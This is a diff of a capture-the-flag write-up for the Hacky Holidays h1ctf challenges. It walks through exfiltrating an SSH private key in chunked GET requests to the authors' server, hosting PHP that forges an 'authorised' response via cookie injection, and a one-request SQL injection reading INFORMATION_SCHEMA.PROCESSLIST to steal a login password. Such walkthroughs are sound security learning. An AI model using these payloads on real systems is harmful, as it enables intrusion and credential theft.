@@ -562,7 +562,7 @@ Once uploaded we can indeed see that the file is rendered as a screenshot
 
 ![upload-](https://user-images.githubusercontent.com/55701068/151658394-0d7689ae-7c8a-4298-be20-96e81db6ef03.png)
 
-5) Trying to obtain the entire file via css etc will work. However trying to extract the page contents via OCR will not be that helpful. We therefore attempt to send the file to our server. This was very problematic, cause we rarely received any request to our server, and the file size was probably way bigger than the allowed size of a payload for a `GET` parameter. We therefore tried to use the HTML code below, to split the send content.
+5) However trying to extract the page contents via OCR will not be that helpful since not all letters will be extracted correctly, therefore we will end up with invalid ssh key. We therefore attempt to send the file to our server. This was very problematic, cause we rarely received any request to our server, and the file size was probably way bigger than the allowed size of a value for a `GET` parameter. The best way to do this would probably be via a `POST` xhr request, sending the file contents as the body of the `POST request, however during the CTF it seemed to be easier to work with GET requests. Therefore we tried to use the HTML code below, to split the content sent into smaller chunks.
 We also had to put the upload request in a loop with some rate limiting cause we only received 2 out of 15 requests send
 ```html
 <script>
@@ -577,7 +577,7 @@ Slowly we were able to extract the `id_rsa` key. You can see below, partial part
 
 ![nase64-encoded-key](https://user-images.githubusercontent.com/55701068/151599014-24f17024-b058-43c9-9759-0c283dcd01aa.png)
 
-6) We had to redo the process with different size of slicing, to confirm all characters where extracted properly and finally we ended up with the correct key.
+6) Due to the base64 encoding, the last parts of the base64 encoded value could be decoded to a wrong value, therefore we had to redo the process with different size of slicing, to confirm all characters where extracted properly and finally we ended up with the correct key.
 
 7) We remember that during initial recon we also had found a github [config directory ](https://c2.hackyholidays.h1ctf.com/.git/config). Which hosted the content below
 ```
@@ -593,7 +593,7 @@ Slowly we were able to extract the `id_rsa` key. You can see below, partial part
         remote = origin
         merge = refs/heads/main
 ```
-So we have a github [repository](https://github.com/grinch-networks-two/directory-protector), which is however not accessible as also all other parts of that user profile.
+So we have a github [repository](https://github.com/grinch-networks-two/directory-protector), which is not accessible as also all other parts of that user profile.
 Github can be set up to use ssh configuration, so the extracted key might be useful here.
 
 8) Running the following commands can confirm access to the github repository and we can grab the flag
@@ -611,7 +611,7 @@ Get flag
 ![flag](https://user-images.githubusercontent.com/55701068/151599179-eaf1191e-7d8b-44c1-b3dc-9ced154fa44e.png)
 
 
-**DAY 12 - Merry Fre*cking Christmas Grinch**
+**DAY 12 - Merry F*cking Christmas Grinch**
 --------------------
 
 1. After  day11  and based on the `README.md` content from that day. We download again the github repository to see for any update.
@@ -686,7 +686,7 @@ Based on the information above we need to craft an attack that:
  1. Will inject our server as the `server` value in our cookie.
  2. Our server should return a response that will include `"authorised":true` and also the correct keyword based on the server's time.
 
-To do this, we host the following PHP code on our server
+To do this, we host the following PHP code on our server. We were lucky enough to have a VPS in the same timezone as the server used for the CTF therefore we did not have to adjuct the date fucntion below.
 ```php
 <?php
 function expectedKeyword($codewords){
@@ -696,7 +696,7 @@ function expectedKeyword($codewords){
     }
 echo "{\"authorised\":true,\"codeword\":\"".expectedKeyword('code.txt')."\"}";
 ```
-Then we server the code like
+Then we serve the code like
 ```bash
 php -S 0.0.0.0:8000 code.php
 ```
@@ -752,6 +752,13 @@ Connection: close
 We continue to attempt to capture the login query by the grinch since he logins every 1 minute and we end up with the password below
 **Grinch Password**
 `Yo9R38!IdobFZF6eFS3#`
+
+After finishing the CTF it was identified that the flag could be extacted with just one request (credits to Jeti for this)
+```http
+GET /infrastructure_management/get_column?column=mid(info,71,10)+FROM+INFORMATION_SCHEMA.PROCESSLIST+where+state+like+'%25sleep'+union+all+select+mid(info,81,10)+FROM+INFORMATION_SCHEMA.PROCESSLIST+where+state+like+'%25sleep'+union+all+select+mid(info,91,10)+FROM+INFORMATION_SCHEMA.PROCESSLIST+where+state+like+'%25sleep'+and+info+like+'%25grinch%25'-- HTTP/1.1
+Host: c2.hackyholidays.h1ctf.com
+
+```
 
 8. We can login now with the credentials
 `grinch:Yo9R38!IdobFZF6eFS3#`
